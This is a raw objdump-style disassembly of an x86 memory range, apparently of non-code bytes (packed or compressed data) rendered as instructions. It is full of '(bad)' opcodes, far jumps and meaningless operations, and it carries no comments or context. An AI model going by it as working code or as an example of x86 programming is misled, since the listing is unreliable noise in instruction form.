  428344:	xchg   DWORD PTR [eax],esi
  428346:	sub    BYTE PTR [edx+0x55244b2f],ch
  42834c:	test   BYTE PTR [esi],bh
  42834e:	push   ebp
  42834f:	scas   al,BYTE PTR es:[edi]
  428350:	lahf   
  428351:	xor    BYTE PTR [edx+edi*8],dh
  428354:	sbb    esp,DWORD PTR [ebx+0x24]
  428357:	test   DWORD PTR [ebx],ebx
  428359:	inc    ebx
  42835a:	and    al,0x89
  42835c:	imul   esp,DWORD PTR ss:[edx+ebx*1],0xffffffb3
  428361:	xchg   ebp,eax
  428362:	inc    esp
  428363:	test   esi,edx
  428365:	bound  eax,QWORD PTR [eax+0x61]
  428368:	xor    DWORD PTR [eax-0x30cd4101],esp
  42836e:	je     0x428306
  428370:	xor    ecx,esp
  428372:	jne    0x428359
  428374:	out    0xd5,eax
  428376:	jmp    0x428373
  428378:	das    
  428379:	sbb    edi,edi
  42837b:	nop
  42837c:	dec    ebp
  42837d:	or     al,0x34
  42837f:	inc    edi
  428380:	push   0xffffffbf
  428382:	cli    
  428383:	pop    esp
  428384:	jge    0x4283c2
  428386:	xchg   eax,ebx
  428388:	dec    ebx
  428389:	jns    0x4283ff
  42838b:	ins    BYTE PTR es:[edi],dx
  42838c:	popa   
  42838d:	jns    0x428403
  42838f:	je     0x4283f2
  428391:	retf   0xafff
  428394:	pop    es
  428395:	lahf   
  428396:	sti    
  428397:	scas   eax,DWORD PTR es:[edi]
  428398:	sbb    bh,dh
  42839a:	and    eax,DWORD PTR [ebx+0x4fc99]
  4283a0:	add    BYTE PTR [eax],al
  4283a2:	add    BYTE PTR [eax],al
  4283a4:	test   al,0x66
  4283a6:	dec    edx
  4283a7:	sti    
  4283a8:	xchg   edi,eax
  4283a9:	and    ecx,edi
  4283ab:	and    esi,DWORD PTR [eax-0x14a32734]
  4283b1:	ret    0xbdd7
  4283b4:	pushf  
  4283b5:	fld    QWORD PTR [esi-0x793f169c]
  4283bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4283bd:	dec    ebx
  4283be:	retf   0x9043
  4283c1:	xor    esp,DWORD PTR [edx]
  4283c3:	out    0x5f,eax
  4283c5:	cmp    eax,0x217c7576
  4283ca:	pop    ebx
  4283cb:	sti    
  4283cc:	lds    ecx,FWORD PTR [ebx+0x24947577]
  4283d2:	cld    
  4283d3:	pop    es
  4283d4:	aas    
  4283d5:	inc    esi
  4283d6:	push   0xfffffff0
  4283d8:	or     al,0xf1
  4283da:	fisub  WORD PTR [ebx]
  4283dc:	adc    eax,0x3816f906
  4283e1:	test   eax,0x171ffb9f
  4283e6:	push   ebx
  4283e7:	je     0x42836b
  4283e9:	dec    ebp
  4283ea:	ja     0x428461
  4283ec:	pushf  
  4283ed:	and    BYTE PTR [ebx],ch
  4283ef:	xchg   ax,ax
  4283f1:	in     al,0xfb
  4283f3:	pop    es
  4283f4:	push   0xffffff9a
  4283f6:	dec    eax
  4283f7:	pop    ss
  4283f8:	inc    ebx
  4283f9:	mov    bl,0x34
  4283fb:	imul   edi,eax,0xeb69012d
  428401:	cmp    DWORD PTR [edx+ecx*8],edi
  428404:	inc    esi
  428405:	(bad)  
  428408:	add    BYTE PTR [eax],al
  42840a:	add    BYTE PTR [eax],al
  42840c:	add    BYTE PTR [eax+0x16d18b01],dl
  428412:	call   0xb2966124
  428417:	mov    WORD PTR [ebx-0x22],ds
  42841a:	cwde   
  42841b:	std    
  42841c:	push   0x4c7a8b0e
  428421:	and    al,0xe1
  428423:	mov    ebp,0xc5ad2ef4
  428428:	jle    0x4283fa
  42842a:	adc    BYTE PTR es:[ebp+0x14],bh
  42842e:	(bad)  
  42842f:	add    DWORD PTR [ebp-0x4],edi
  428432:	(bad)  
  428433:	std    
  428434:	rcr    ah,1
  428436:	lods   eax,DWORD PTR ds:[esi]
  428437:	sub    ah,BYTE PTR [eax]
  428439:	lods   al,BYTE PTR ds:[esi]
  42843a:	cmp    DWORD PTR [esi-0x3e290398],ebp
  428440:	push   0x68d9d6e4
  428445:	(bad)  
  428447:	shr    DWORD PTR [eax-0x1c],1
  42844a:	(bad)  
  42844b:	test   eax,0x27746fd1
  428450:	add    edx,DWORD PTR [eax+0x725c6639]
  428456:	cmp    edx,esp
  428458:	pop    ds
  428459:	ins    BYTE PTR es:[edi],dx
  42845a:	cmp    edx,ebp
  42845c:	pop    ds
  42845d:	push   0xa468ab05
  428462:	(bad)  
  428463:	sbb    DWORD PTR [ecx-0x64],ebp
  428466:	(bad)  
  428467:	adc    DWORD PTR [ecx-0x5c],ebp
  42846a:	(bad)  
  42846b:	jmp    0x21920d8
  428470:	imul   eax,DWORD PTR [eax],0x0
  428476:	test   dh,dl
  428478:	sbb    DWORD PTR [ecx-0x1e],ebp
  42847b:	cmp    BYTE PTR [edi],cl
  42847d:	cmp    DWORD PTR [edi-0x7b],edi
  428480:	arpl   bx,di
  428482:	pop    ebx
  428483:	das    
  428484:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428485:	es js  0x4284bf
  428488:	iret   
  428489:	xchg   ebp,eax
  42848a:	mov    bl,0x1
  42848c:	inc    edx
  42848d:	push   ss
  42848e:	out    dx,eax
  42848f:	sar    BYTE PTR [edx],1
  428491:	bound  ebx,QWORD PTR [ebx-0x58329c57]
  428497:	test   eax,0xa99fc563
  42849c:	arpl   bp,cx
  42849e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42849f:	add    ah,ch
  4284a1:	jne    0x42843a
  4284a3:	loop   0x42851d
  4284a5:	call   0xdee2a3f5
  4284aa:	das    
  4284ab:	ss enter 0x915d,0x9a
  4284b0:	(bad)
  4284b4:	dec    esp
  4284b5:	jb     0x428485
  4284b7:	or     BYTE PTR [edx+0x22],cl
  4284ba:	ror    dh,cl
  4284bc:	push   cs
  4284bd:	sbb    ah,BYTE PTR [ecx+0x2]
  4284c0:	cwde   
  4284c1:	hlt    
  4284c2:	mov    ds:0x5ee9531e,eax
  4284c7:	xchg   esp,eax
  4284c8:	es xchg ebx,eax
  4284ca:	out    dx,eax
  4284cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4284cc:	cdq    
  4284cd:	mov    cl,0x10
  4284cf:	test   BYTE PTR [ebx-0x3e],ah
  4284d2:	mov    ebx,0xb7867974
  4284d7:	xor    eax,0xf5cf
  4284dc:	add    BYTE PTR [eax],al
  4284de:	add    BYTE PTR [ecx+0x33],dh
  4284e1:	imul   ecx,ebp,0xffffff9f
  4284e4:	xor    edi,DWORD PTR [ebx-0x3b]
  4284e7:	(bad)  
  4284e8:	(bad)  
  4284e9:	jmp    0x4284c8
  4284eb:	(bad)  
  4284ec:	(bad)  
  4284ed:	xchg   edi,eax
  4284ee:	xor    DWORD PTR [ecx-0x57],eax
  4284f1:	arpl   WORD PTR ds:0x563a770,cx
  4284f7:	jo     0x4284f9
  4284f9:	test   DWORD PTR [eax],0xf658b
  4284ff:	and    BYTE PTR [esi],0xf4
  428502:	push   ds
  428503:	jb     0x42849f
  428505:	xor    BYTE PTR [edx+esi*2],ah
  428508:	mov    dh,BYTE PTR [eax]
  42850a:	sbb    al,0x2e
  42850c:	adc    eax,0x82cd2463
  428511:	jmp    0xe80e528a
  428516:	je     0x4284e5
  428518:	retf   
  428519:	out    0xd6,eax
  42851b:	inc    edx
  42851c:	es xchg ebx,eax
  42851e:	fstp   TBYTE PTR ds:0x7ce4f6c7
  428524:	adc    ebp,eax
  428526:	test   DWORD PTR [ecx-0x5e],ebp
  428529:	inc    BYTE PTR [edx+0x1161b6b7]
  42852f:	pop    esi
  428530:	sub    ecx,0x93d68d74
  428536:	enter  0x9bc6,0x30
  42853a:	and    BYTE PTR [ecx-0x5c],ah
  42853d:	mov    al,ds:0xc42b46ff
  428542:	je     0x428544
  428544:	add    BYTE PTR [eax],al
  428546:	add    BYTE PTR [eax],al
  428548:	ins    BYTE PTR es:[edi],dx
  428549:	pop    es
  42854a:	push   edi
  42854b:	jmp    0x753f:0x8b481426
  428552:	dec    ebx
  428553:	pop    ebx
  428554:	cmp    edi,DWORD PTR [ebx-0x2d7a7cf2]
  42855a:	adc    al,BYTE PTR [eax]
  42855c:	call   0x2d2:0x958b4181
  428563:	mov    esp,DWORD PTR [ebx]
  428565:	sub    DWORD PTR [eax+0xeaf2800],ecx
  42856b:	mov    ah,BYTE PTR [esi-0x4a]
  42856e:	or     eax,0xce283900
  428573:	jbe    0x42856d
  428575:	(bad)  
  428576:	ror    DWORD PTR [ecx+0x140c5d90],1
  42857c:	mov    esi,0x460b50fb
  428581:	call   0x980899eb
  428586:	jbe    0x428593
  428588:	inc    esi
  428589:	aam    0x65
  42858b:	add    al,0xb9
  42858d:	adc    esp,ebp
  42858f:	cmp    DWORD PTR [eax],ebx
  428591:	lods   eax,DWORD PTR ds:[esi]
  428592:	cmp    ecx,DWORD PTR [ebx]
  428594:	push   ds
  428595:	popf   
  428596:	xor    cl,BYTE PTR [ebx]
  428598:	xlat   BYTE PTR es:[ebx]
  42859a:	adc    al,cl
  42859c:	adc    DWORD PTR [edx-0x666fff8c],edi
  4285a2:	data16 add al,0x89
  4285a5:	and    BYTE PTR [ebx+eiz*1+0x28ec6798],ah
  4285ac:	add    BYTE PTR [eax],al
  4285ae:	add    BYTE PTR [eax],al
  4285b0:	add    BYTE PTR [eax],cl
  4285b2:	push   esi
  4285b3:	adc    BYTE PTR [ebp-0x51],al
  4285b6:	in     al,0x2e
  4285b8:	adc    al,0x1d
  4285ba:	push   esp
  4285bb:	aad    0x87
  4285bd:	call   FWORD PTR [eax+0x11900011]
  4285c3:	mov    dl,0x1
  4285c5:	xchg   ecx,eax
  4285c6:	fwait
  4285c7:	adc    BYTE PTR [ebx-0x1b],bl
  4285ca:	aam    0x50
  4285cc:	or     BYTE PTR [eax-0xb792637],dl
  4285d2:	scas   eax,DWORD PTR es:[edi]
  4285d3:	out    0x2e,al
  4285d5:	popw   ss
  4285d7:	jb     0x42864d
  4285d9:	xchg   ah,ch
  4285db:	gs pop esp
  4285dd:	mov    ah,0xa7
  4285df:	pop    es
  4285e0:	(bad)  
  4285e1:	or     dl,BYTE PTR [eax-0x6e6bd1ff]
  4285e7:	stos   BYTE PTR es:[edi],al
  4285e8:	xchg   DWORD PTR [edx-0x3bc8af94],edx
  4285ee:	ja     0x428608
  4285f0:	or     ecx,esp
  4285f2:	sub    edx,ecx
  4285f4:	dec    edx
  4285f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4285f6:	mov    dl,0x3f
  4285f8:	leave  
  4285f9:	retf   0x3808
  4285fc:	clc    
  4285fd:	pop    ds
  4285fe:	add    ebp,DWORD PTR [ebx-0x25c23d33]
  428604:	pop    ds
  428605:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428606:	cmp    eax,0xce4c7b38
  42860b:	stc    
  42860c:	js     0x4285f7
  42860e:	cmp    eax,0xb9fb7f26
  428613:	jno    0x428651
  428615:	add    BYTE PTR [eax],al
  428617:	add    BYTE PTR [eax],al
  428619:	add    BYTE PTR [eax+0x4c76f5b2],dl
  42861f:	into   
  428620:	loope  0x42863a
  428622:	call   0xa643162c
  428627:	lea    ecx,[ebx-0x48]
  42862a:	jae    0x4285f2
  42862c:	scas   eax,DWORD PTR es:[edi]
  42862d:	jle    0x4285fa
  42862f:	push   ds
  428630:	loopne 0x4286ab
  428632:	xchg   esp,eax
  428633:	(bad)  [ebp+eiz*2+0x58f73af7]
  42863a:	scas   eax,DWORD PTR es:[edi]
  42863b:	outs   dx,DWORD PTR ds:[esi]
  42863c:	test   DWORD PTR [ebx],0x5942fc51
  428642:	mov    esp,DWORD PTR [eax+0x32]
  428645:	and    BYTE PTR [eax-0x47],bh
  428648:	or     edi,0xffffffb3
  42864b:	retf   
  42864c:	pusha  
  42864d:	inc    edx
  42864e:	push   ecx
  42864f:	call   0xab6f:0xb57180f8
  428656:	pusha  
  428657:	cmp    BYTE PTR [esi],dh
  428659:	add    al,0x51
  42865b:	xchg   ebx,eax
  42865c:	cli    
  42865d:	js     0x428685
  42865f:	jae    0x4286df
  428661:	call   DWORD PTR [esi-0x4c488f8d]
  428667:	int3   
  428668:	outs   dx,DWORD PTR ds:[esi]
  428669:	fwait
  42866a:	pusha  
  42866b:	cmp    BYTE PTR [esi],dh
  42866d:	add    al,0xc7
  42866f:	outs   dx,DWORD PTR ds:[esi]
  428670:	stc    
  428671:	add    DWORD PTR [edi-0x4d],0xe
  428675:	inc    DWORD PTR [ebp+0x10a8a4bd]
  42867b:	mov    BYTE PTR [eax+ebp*1],bl
  42867e:	add    BYTE PTR [eax],al
  428680:	add    BYTE PTR [eax],al
  428682:	add    BYTE PTR [ecx+0x1d51cfa8],dh
  428688:	mov    al,0xd0
  42868a:	arpl   WORD PTR [ebx],ax
  42868c:	sbb    BYTE PTR [ebp+0x119193a9],0x7b
  428693:	scas   al,BYTE PTR es:[edi]
  428694:	xor    ch,al
  428696:	jmp    0x428685
  428698:	mov    edx,0x29527f1b
  42869d:	out    dx,eax
  42869e:	out    dx,al
  42869f:	imul   edi,DWORD PTR [edx],0xa8d377bf
  4286a5:	stc    
  4286a6:	jmp    0x4286ca
  4286a8:	out    0x8e,eax
  4286aa:	xchg   ebp,eax
  4286ab:	ja     0x428673
  4286ad:	push   cs
  4286ae:	xchg   ebp,eax
  4286af:	jae    0x42866e
  4286b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4286b2:	cs in  eax,0x39
  4286b5:	adc    eax,0x756eedee
  4286ba:	pusha  
  4286bb:	cmc    
  4286bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4286bd:	sbb    eax,0x96145137
  4286c2:	das    
  4286c3:	cwde   
  4286c4:	mov    ebp,0x39aaa8a4
  4286c9:	push   ebp
  4286ca:	out    dx,eax
  4286cb:	push   cs
  4286cc:	je     0x4286e5
  4286ce:	ret    0x3aa2
  4286d1:	sub    eax,0x96b38271
  4286d6:	pop    ss
  4286d7:	xchg   esi,eax
  4286d8:	cmp    bl,BYTE PTR [ebp-0x16]
  4286db:	push   cs
  4286dc:	jne    0x4286f1
  4286de:	fs repz mov ebx,0xabf32d91
  4286e5:	in     al,dx
  4286e6:	jb     0x4286e8
  4286e8:	add    BYTE PTR [eax],al
  4286ea:	add    BYTE PTR [eax],al
  4286ec:	dec    eax
  4286ed:	aam    0xfe
  4286ef:	xor    DWORD PTR [edi-0x259db35e],esp
  4286f5:	or     al,0x4a
  4286f7:	add    BYTE PTR [eax-0x10],dh
  4286fa:	push   ss
  4286fb:	add    BYTE PTR [edx-0x4dace4de],ch
  428701:	jb     0x428733
  428703:	adc    al,0x87
  428705:	aaa    
  428706:	fiadd  WORD PTR [ebx]
  428708:	iret   
  428709:	imul   edx,DWORD PTR [edi-0x6a556aac],0xfffffffa
  428710:	cmp    bh,0x17
  428713:	and    DWORD PTR [eax],0xffffffaf
  428716:	push   cs
  428717:	add    BYTE PTR [ecx+eax*8],ah
  42871a:	stc    
  42871b:	xor    ebx,DWORD PTR [ebx+0x1673fbc7]
  428721:	mov    esi,0x89b084d5
  428726:	push   eax
  428727:	sub    BYTE PTR ds:0x630032d0,0xc4
  42872e:	bound  eax,QWORD PTR ds:0xeaecfc6a
  428734:	mov    eax,0xa4419b79
  428739:	rcl    BYTE PTR [edi+0x77],cl
  42873c:	ret    0xa0c4
  42873f:	shl    DWORD PTR [ebx],0x36
  428742:	pop    edx
  428743:	mov    ?,ecx
  428745:	mov    bl,0xf3
  428747:	add    cl,BYTE PTR [ebx+0x45c992f5]
  42874d:	test   eax,0x646d
  428752:	add    BYTE PTR [eax],al
  428754:	add    BYTE PTR [ebp-0x47731356],al
  42875a:	out    dx,eax
  42875b:	pop    ss
  42875c:	mov    dh,0x39
  42875e:	xor    esp,esi
  428760:	and    al,0x6e
  428762:	outs   dx,DWORD PTR ds:[esi]
  428763:	push   eax
  428764:	and    al,0x55
  428766:	xor    eax,0x7d2a3bd7
  42876b:	test   al,0x84
  42876d:	and    BYTE PTR [edi+0x11],bh
  428770:	inc    ebp
  428771:	push   ebp
  428773:	xchg   esi,eax
  428774:	dec    esp
  428775:	nop
  428776:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428777:	loopne 0x4287b6
  428779:	adc    eax,DWORD PTR [ebx+0x14]
  42877c:	jl     0x42876b
  42877e:	adc    eax,0x23c8745f
  428783:	fsub   QWORD PTR [ebx]
  428785:	mov    al,ds:0x8123d413
  42878a:	adc    esp,DWORD PTR [ebx+eiz*1-0x18d267e]
  428791:	fild   WORD PTR [eax]
  428793:	adc    al,0x6
  428795:	dec    eax
  428796:	adc    edx,esp
  428798:	and    esp,DWORD PTR [ecx-0x4fdc23ef]
  42879e:	and    ebx,DWORD PTR [edx-0x40]
  4287a1:	jmp    0x8d22d840
  4287a6:	xchg   ebx,eax
  4287a7:	pop    eax
  4287a8:	shl    dl,0x8e
  4287ab:	sbb    dl,BYTE PTR [esp+ebp*4-0x54]
  4287af:	cwde   
  4287b0:	dec    esp
  4287b1:	mov    ah,0x7a
  4287b3:	add    eax,0xa41145c9
  4287b8:	and    eax,DWORD PTR [eax]
  4287ba:	add    BYTE PTR [eax],al
  4287bc:	add    BYTE PTR [eax],al
  4287be:	jb     0x4287ce
  4287c0:	pop    edi
  4287c1:	jp     0x428757
  4287c3:	and    edx,esp
  4287c5:	or     esi,DWORD PTR [eax+0x21]
  4287c8:	sbb    DWORD PTR [ebx+0x51],eax
  4287cb:	fs aas 
  4287cd:	jl     0x428773
  4287cf:	arpl   WORD PTR [ebp+0xb],ax
  4287d2:	adc    bl,dh
  4287d4:	ins    DWORD PTR es:[edi],dx
  4287d5:	sti    
  4287d6:	lahf   
  4287d7:	and    esp,DWORD PTR [edi+0x39de7823]
  4287dd:	neg    BYTE PTR [ebx]
  4287df:	dec    ebp
  4287e0:	into   
  4287e1:	pop    ecx
  4287e2:	jmp    0x4287fc
  4287e4:	push   edi
  4287e5:	or     al,0x52
  4287e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4287e8:	adc    BYTE PTR [esi-0x78eaec6f],al
  4287ee:	aam    0xaf
  4287f0:	push   ss
  4287f1:	jg     0x42885b
  4287f3:	mov    bl,0xf6
  4287f5:	fld    DWORD PTR [ecx-0x6f298504]
  4287fb:	fldcw  WORD PTR [edi+0x70a5e08f]
  428801:	or     BYTE PTR [ecx+0x8613be0],al
  428807:	lods   eax,DWORD PTR ds:[esi]
  428808:	xor    ecx,esi
  42880a:	mov    esp,0x9446049e
  42880f:	mov    dl,0x3
  428811:	lea    esi,[esi]
  428813:	(bad)  
  428814:	pusha  
  428815:	loopne 0x42888a
  428817:	mov    dh,0x30
  428819:	push   edx
  42881a:	pushf  
  42881b:	mov    dh,0xac
  42881d:	mov    dl,0x61
  42881f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428820:	jecxz  0x4287e1
  428822:	add    BYTE PTR [eax],al
  428824:	add    BYTE PTR [eax],al
  428826:	add    BYTE PTR [ecx-0x2b7b0a0e],ah
  42882c:	mov    dh,0x7a
  42882e:	sar    edx,1
  428830:	das    
  428831:	das    
  428832:	fcom   DWORD PTR [ebp-0x14ed4dc8]
  428838:	loop   0x428833
  42883a:	adc    cl,BYTE PTR [ecx+0x1f]
  42883d:	add    al,0xc1
  42883f:	cmp    DWORD PTR [eax-0x6],esi
  428842:	add    ecx,DWORD PTR [edi-0x6a]
  428845:	retf   0x5cb4
  428848:	cld    
  428849:	pusha  
  42884a:	fdiv   DWORD PTR [ebx-0x3a]
  42884d:	test   al,0x3c
  42884f:	or     edi,edi
  428851:	fincstp 
  428853:	sbb    bh,dh
  428855:	shl    ebx,1
  428857:	inc    edx
  428858:	cmp    BYTE PTR [ecx-0x9baf717],ah
  42885e:	add    dl,BYTE PTR [eax+0x174470b2]
  428864:	jl     0x428801
  428866:	add    edx,DWORD PTR [ecx+0x7e8bf5b2]
  42886c:	in     eax,0x37
  42886e:	jmp    0x2dc9:0x3b0f6fbe
  428875:	in     eax,dx
  428876:	arpl   WORD PTR [eax+0x2c],bp
  428879:	arpl   bp,cx
  42887b:	addr16 mov eax,0xae05aaa4
  428881:	push   ds
  428882:	bound  esp,QWORD PTR [edi-0x2f]
  428885:	cs jmp 0x428855
  428888:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428889:	aam    0x71
  42888b:	add    BYTE PTR [eax],al
  42888d:	add    BYTE PTR [eax],al
  42888f:	add    BYTE PTR [edi-0x2f],cl
  428892:	(bad)  
  428893:	in     eax,dx
  428894:	sbb    DWORD PTR [ebx-0x13],edi
  428897:	stos   BYTE PTR es:[edi],al
  428898:	sbb    eax,0x98611dae
  42889d:	cmp    al,BYTE PTR [ebx]
  42889f:	sbb    BYTE PTR [ecx+0x5e1ad060],al
  4288a5:	fst    QWORD PTR [edx+0xd]
  4288a8:	or     al,0xb8
  4288aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4288ab:	and    ah,BYTE PTR [eax+0xdaed8ee]
  4288b1:	mov    ebx,DWORD PTR [ecx+0x59b5afad]
  4288b7:	mov    esp,0x8c4d0955
  4288bc:	and    al,0x24
  4288be:	shl    ebp,cl
  4288c0:	push   ebp
  4288c1:	scas   al,BYTE PTR es:[edi]
  4288c2:	push   cs
  4288c3:	xchg   ecx,eax
  4288c4:	lea    esi,[ebx+0x1e30e90e]
  4288ca:	xor    esp,ecx
  4288cc:	push   ss
  4288cd:	repz adc bl,BYTE PTR [ecx-0x28b540d0]
  4288d4:	shl    DWORD PTR [ecx+edx*4+0x13649f2d],cl
  4288db:	jmp    0xe9522f9b
  4288e0:	xchg   ebx,eax
  4288e1:	aaa    
  4288e2:	dec    esi
  4288e3:	in     eax,0xe3
  4288e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4288e6:	arpl   WORD PTR ds:0x2d02a7a0,cx
  4288ec:	jle    0x4288d2
  4288ee:	push   cs
  4288ef:	add    dl,ch
  4288f1:	cli    
  4288f2:	sbb    al,dl
  4288f4:	add    BYTE PTR [eax],al
  4288f6:	add    BYTE PTR [eax],al
  4288f8:	add    BYTE PTR [ebp-0x50],ch
  4288fb:	xchg   ebx,eax
  4288fc:	add    edx,edi
  4288fe:	push   ss
  4288ff:	pcmpeqb mm1,QWORD PTR [edx+0x78]
  428903:	arpl   WORD PTR [ecx],sp
  428905:	loop   0x428981
  428907:	xor    BYTE PTR [eax+eiz*8],al
  42890a:	ins    DWORD PTR es:[edi],dx
  42890b:	adc    BYTE PTR [ebx-0x76e92583],cl
  428911:	js     0x4288c9
  428913:	repz adc edx,eax
  428916:	push   0x30
  428918:	or     BYTE PTR [ebp+ebp*2-0x258a74f0],ah
  42891f:	adc    dl,BYTE PTR [eax+0x11]
  428922:	(bad)  
  428923:	out    0xff,eax
  428925:	mov    dh,0xf0
  428927:	push   ss
  428928:	add    ah,bl
  42892a:	cmp    bl,bh
  42892c:	mov    edi,eax
  42892e:	xor    bh,dh
  428930:	add    ch,bl
  428932:	mov    edi,0x30f17456
  428937:	test   DWORD PTR [ebx],0xc03cac3d
  42893d:	push   edx
  42893e:	mov    ebx,0x4f14d93
  428943:	bound  ecx,QWORD PTR [edx+eiz*2]
  428946:	(bad)  
  428948:	scas   eax,DWORD PTR es:[edi]
  428949:	ja     0x42894e
  42894b:	call   0x5e47693b
  428950:	or     BYTE PTR [esi+0x48b107d],dl
  428956:	mov    eax,0x38a575e7
  42895b:	mov    esi,0xe8
  428960:	add    BYTE PTR [eax],al
  428962:	inc    ebp
  428963:	adc    ch,al
  428965:	call   DWORD PTR [edx-0x52be6463]
  42896b:	cmp    BYTE PTR [edx+0x8],bl
  42896e:	pop    ecx
  42896f:	add    esp,DWORD PTR [edx+0xc]
  428972:	nop
  428973:	adc    BYTE PTR [ebx],ah
  428975:	call   0xfb8fff22
  42897a:	inc    eax
  42897b:	call   0x86a7:0x9988bdcf
  428982:	jl     0x428947
  428984:	xchg   edi,eax
  428985:	jne    0x42891b
  428987:	adc    BYTE PTR [ebx],ah
  428989:	test   DWORD PTR [esi-0x3a],esp
  42898c:	push   ss
  42898d:	das    
  42898e:	push   eax
  42898f:	inc    eax
  428990:	lods   eax,DWORD PTR ds:[esi]
  428991:	xchg   BYTE PTR [edx+0x51275b88],dl
  428997:	mov    ebp,0x7dc447cf
  42899c:	fdiv   DWORD PTR [ebx-0x61]
  42899f:	loope  0x428967
  4289a1:	adc    al,bl
  4289a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4289a4:	fild   DWORD PTR [esi+0x4d9989bd]
  4289aa:	mov    BYTE PTR [ebx+0x78],ah
  4289ad:	push   eax
  4289ae:	push   ss
  4289af:	add    al,0x4d
  4289b1:	out    0xc9,eax
  4289b3:	push   0x79
  4289b5:	(bad)  
  4289b6:	jns    0x428952
  4289b8:	cdq    
  4289b9:	push   ebp
  4289ba:	mov    al,ds:0x5e07bf20
  4289bf:	add    edx,edi
  4289c1:	sti    
  4289c2:	out    dx,eax
  4289c3:	fistp  DWORD PTR [eax+0xc8]
  4289c9:	add    BYTE PTR [eax],al
  4289cb:	sti    
  4289cc:	stos   BYTE PTR es:[edi],al
  4289cd:	dec    ebx
  4289ce:	outs   dx,BYTE PTR ds:[esi]
  4289cf:	mov    BYTE PTR [eax],ah
  4289d1:	mov    edi,0x1446d707
  4289d6:	xchg   DWORD PTR [ebp-0x57],esp
  4289d9:	mov    ds:0x4cb579e7,al
  4289de:	sti    
  4289df:	stos   DWORD PTR es:[edi],eax
  4289e0:	mov    BYTE PTR [ecx-0x31e977b3],bl
  4289e6:	add    ebx,DWORD PTR [ebx]
  4289e8:	inc    esi
  4289e9:	loopne 0x428a3a
  4289eb:	ds mov cl,0xb1
  4289ee:	neg    DWORD PTR [edi-0x35760b4f]
  4289f4:	ss mov bh,0xbe
  4289f7:	in     al,dx
  4289f8:	je     0x4289ec
  4289fa:	add    edx,edi
  4289fc:	sub    eax,0xb616b69f
  428a01:	or     al,0x89
  428a03:	hlt    
  428a04:	(bad)  
  428a05:	ror    ebx,0x16
  428a08:	jb     0x428a38
  428a0a:	fadd   DWORD PTR [ebx-0x9dbdd16]
  428a10:	mov    ch,0xc8
  428a12:	xor    DWORD PTR [ecx+0x4302352f],edi
  428a18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428a19:	jno    0x428a67
  428a1b:	push   ecx
  428a1c:	xchg   esp,eax
  428a1d:	clc    
  428a1e:	push   0x10f90c8b
  428a23:	inc    esi
  428a24:	cld    
  428a25:	jp     0x4289ec
  428a27:	sub    eax,0x588967a9
  428a2c:	je     0x4289c5
  428a2e:	add    DWORD PTR [eax],eax
  428a30:	add    BYTE PTR [eax],al
  428a32:	add    BYTE PTR [eax],al
  428a34:	sub    ah,ch
  428a36:	add    DWORD PTR [eax+edx*4],eax
  428a39:	sub    eax,0x27028746
  428a3e:	in     eax,0xb5
  428a40:	bound  esp,QWORD PTR [ecx+0x2d9827c2]
  428a46:	and    DWORD PTR [ebx+edi*4-0x5f],ebp
  428a4a:	sub    eax,0xaa73155d
  428a4f:	or     eax,0xfc11ef0f
  428a54:	adc    al,0x6c
  428a56:	mov    al,BYTE PTR [ecx]
  428a58:	or     DWORD PTR [eax+eiz*2+0x70abb746],esi
  428a5f:	dec    esi
  428a60:	mov    eax,0x9003a9e6
  428a65:	in     eax,0x35
  428a67:	mov    ebp,0x1037fd59
  428a6c:	nop
  428a6d:	pop    es
  428a6e:	punpckldq mm4,DWORD PTR [eax]
  428a71:	cmp    DWORD PTR [esi],ecx
  428a73:	push   0x2c
  428a75:	mov    dl,0x62
  428a77:	sbb    esp,eax
  428a79:	and    eax,0xa1fb6a07
  428a7e:	pusha  
  428a7f:	in     eax,dx
  428a80:	mov    eax,ds:0x916f872
  428a85:	out    dx,eax
  428a86:	push   ss
  428a87:	(bad)  
  428a88:	pop    esi
  428a89:	lods   eax,DWORD PTR ds:[esi]
  428a8a:	xchg   edi,eax
  428a8b:	cwde   
  428a8c:	sti    
  428a8d:	inc    eax
  428a8e:	jmp    0x42ae:0x3599c4b6
  428a95:	mov    ecx,0x18eb
  428a9a:	add    BYTE PTR [eax],al
  428a9c:	add    BYTE PTR [eax-0x130ea5c7],cl
  428aa2:	daa    
  428aa3:	sbb    esp,DWORD PTR [edx-0x7e]
  428aa6:	mov    dh,BYTE PTR [esi-0x6e]
  428aa9:	fcomp  QWORD PTR [ebp-0xcf92708]
  428aaf:	adc    dh,BYTE PTR [edx+0x5e]
  428ab2:	mov    ecx,0xad3e763e
  428ab7:	xchg   edi,eax
  428ab8:	cwde   
  428ab9:	stos   DWORD PTR es:[edi],eax
  428aba:	xchg   edi,eax
  428abb:	jmp    0xea53f26
  428ac0:	mov    esp,0xbc0eaa51
  428ac5:	sbb    BYTE PTR [esi-0x53199dbb],cl
  428acb:	xchg   edi,eax
  428acc:	sbb    BYTE PTR [esi],cl
  428ace:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428acf:	(bad)  
  428ad0:	in     eax,0x80
  428ad2:	jb     0x428acc
  428ad4:	xchg   esi,eax
  428ad5:	sbb    BYTE PTR [eax+0x73a82021],ah
  428adb:	arpl   WORD PTR [edx-0x4ec4db35],bp
  428ae1:	out    0xc3,eax
  428ae3:	push   esi
  428ae4:	popf   
  428ae5:	ret    0x61f8
  428ae8:	mov    al,ds:0xffff0708
  428aed:	inc    edx
  428aee:	jo     0x428b04
  428af0:	push   esi
  428af1:	xor    DWORD PTR [edx-0x15],0x26189eff
  428af8:	push   ecx
  428af9:	xchg   edx,eax
  428afa:	mov    bl,0x74
  428afc:	add    DWORD PTR [edx],esp
